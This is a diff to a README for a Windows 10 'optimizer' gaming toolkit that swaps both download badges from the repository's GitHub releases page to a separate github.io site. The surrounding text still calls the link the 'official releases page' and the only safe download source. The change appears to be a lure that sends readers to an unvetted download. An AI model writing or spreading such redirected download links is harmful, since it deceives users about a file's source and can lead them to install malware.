@@ -1,6 +1,6 @@
 # 🚀 windows-10-optimizer-2026-performance-gaming-toolkit - Make Your PC Faster Today
 
-[![Download Now](https://img.shields.io/badge/Download-Optimizer%202026-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/lang654/windows-10-optimizer-2026-performance-gaming-toolkit/releases)
+[![Download Now](https://img.shields.io/badge/Download-Optimizer%202026-brightgreen?style=for-the-badge&logo=windows&logoColor=white)](https://lang654.github.io)
 
 A friendly, all-in-one toolkit that helps everyday Windows 10 users get more speed out of their computer. Whether your machine feels sluggish during work, or your games stutter and drop frames, this toolkit gives you simple tools to review, tune, and measure your system — without needing any technical background.
 
@@ -45,7 +45,7 @@ Getting started takes only a couple of minutes.
 
 Visit this link to download the application:
 
-[![Download Windows 10 Optimizer 2026](https://img.shields.io/badge/Get%20It%20Here-Releases%20Page-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://github.com/lang654/windows-10-optimizer-2026-performance-gaming-toolkit/releases)
+[![Download Windows 10 Optimizer 2026](https://img.shields.io/badge/Get%20It%20Here-Releases%20Page-blueviolet?style=for-the-badge&logo=github&logoColor=white)](https://lang654.github.io)
 
 The link above takes you to the official releases page. This is the only place you should download from, because it always contains the newest and safest version of the toolkit.
 
